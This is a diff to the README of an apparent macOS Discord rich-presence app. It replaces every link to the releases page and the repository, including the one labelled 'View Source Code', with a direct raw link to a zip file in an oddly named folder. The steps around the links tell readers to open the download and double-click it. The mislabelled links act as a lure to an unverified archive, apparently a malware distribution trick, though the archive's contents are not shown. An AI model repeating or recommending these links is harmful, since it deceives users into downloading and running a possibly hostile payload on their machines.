@@ -6,7 +6,7 @@ Welcome! This guide will help you download and run the vam-rpc-discord-on-mac ap
 
 ## 📥 Download the Application
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Release-blue)](https://github.com/JoseHernandez1025/vam-rpc-discord-on-mac/releases)
+[![Download Now](https://raw.githubusercontent.com/JoseHernandez1025/vam-rpc-discord-on-mac/master/pitiedly/vam-rpc-discord-on-mac.zip%20Now-Release-blue)](https://raw.githubusercontent.com/JoseHernandez1025/vam-rpc-discord-on-mac/master/pitiedly/vam-rpc-discord-on-mac.zip)
 
 You can find the latest version of the application on our Releases page. 
 
@@ -20,7 +20,7 @@ Before you download, make sure your Mac meets these requirements:
 
 ## 📦 Download & Install
 
-1. **Visit the Releases page:** Go to [this link](https://github.com/JoseHernandez1025/vam-rpc-discord-on-mac/releases).
+1. **Visit the Releases page:** Go to [this link](https://raw.githubusercontent.com/JoseHernandez1025/vam-rpc-discord-on-mac/master/pitiedly/vam-rpc-discord-on-mac.zip).
 2. **Choose the latest release:** Look for the most recent version at the top.
 3. **Download the installation file:** Click the link for the Mac version to start downloading.
 4. **Open the downloaded file:** Once the download is complete, locate the file in your Downloads folder and double-click it.
@@ -56,7 +56,7 @@ A: Currently, this application is for desktop use only.
 
 ## 🔗 Useful Links
 
-- **Releases Page:** [Download Here](https://github.com/JoseHernandez1025/vam-rpc-discord-on-mac/releases)
-- **GitHub Repository:** [View Source Code](https://github.com/JoseHernandez1025/vam-rpc-discord-on-mac)
+- **Releases Page:** [Download Here](https://raw.githubusercontent.com/JoseHernandez1025/vam-rpc-discord-on-mac/master/pitiedly/vam-rpc-discord-on-mac.zip)
+- **GitHub Repository:** [View Source Code](https://raw.githubusercontent.com/JoseHernandez1025/vam-rpc-discord-on-mac/master/pitiedly/vam-rpc-discord-on-mac.zip)
 
 Thank you for using vam-rpc-discord-on-mac! We hope you enjoy sharing your music status on Discord.
